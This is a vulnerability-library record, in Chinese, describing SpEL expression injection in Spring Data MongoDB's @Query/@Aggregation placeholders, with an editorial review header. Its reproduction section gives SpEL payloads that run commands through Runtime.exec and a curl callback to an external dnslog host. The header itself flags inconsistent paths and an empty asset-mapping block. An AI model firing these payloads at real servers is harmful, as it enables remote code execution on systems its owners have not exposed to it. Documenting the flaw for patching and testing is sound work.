---
source: "wy876 漏洞文库"
product: "Spring Data MongoDB/SpEL"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "SpringDataMongoDBSpEL表达式注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：3.4.0、3.3.0–3.3.4及旧版，需特定@Query/@Aggregation中的?0参数位置"
side_effects: "未执行；本文需注意的操作影响：缺关键注解且验证有系统副作用；apt-get更新安装需额外权限，单URL不证明查询中执行SpEL"
source_status: "unknown"
id: "vw-fb761b33bd9a2ffc137a7ebf"
entity_id: "ve-fb761b33bd9a2ffc137a7ebf"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：3.4.0、3.3.0–3.3.4及旧版，需特定@Query/@Aggregation中的?0参数位置

代码与实验材料：三个URL无注解/响应；前两apt更新/安装改变系统

来源证据范围：wy876语雀无原公告

- **操作与副作用边界（1）**：缺关键注解且验证有系统副作用；依据：apt-get更新安装需额外权限，单URL不证明查询中执行SpEL。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（2）**：路径及回调不一致；依据：/name=与/?name混用、外部固定域依赖原实验环境，测绘空块/无修复版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring Data MongoDB SpEL表达式注入漏洞

# 一、漏洞描述
Spring官方发布了关于Spring Data MongoDB SpEL表达式注入漏洞的修复信息，当使用@Query或@Aggregation注解进行查询时，若通过SpEL表达式中形如“?0”的占位符来进行参数赋值，同时应用程序未对用户输入进行过滤处理，则可能受到SpEL表达式注入的影响，成功利用该漏洞的攻击者可在目标服务器上执行代码。

# 二、影响版本
Spring Data MongoDB == 3.4.0

3.3.0 <= Spring Data MongoDB <= 3.3.4

旧的、不受支持的版本也会受到影响

# 三、资产测绘
```plain

```
> 注：原文资产测绘内容未保留；现有材料无对应查询，待核原文。



# 三、漏洞复现
```plain
#更新
/name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('apt-get update')

#下载curl
/name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('apt-get install -y curl')
```

执行curl dnslog

```plain
/?name=T(java.lang.String).forName(%27java.lang.Runtime%27).getRuntime().exec(%27curl%20hrnceuwsrl.iyhc.eu.org%27)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dcbhf1pnmuar814k>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
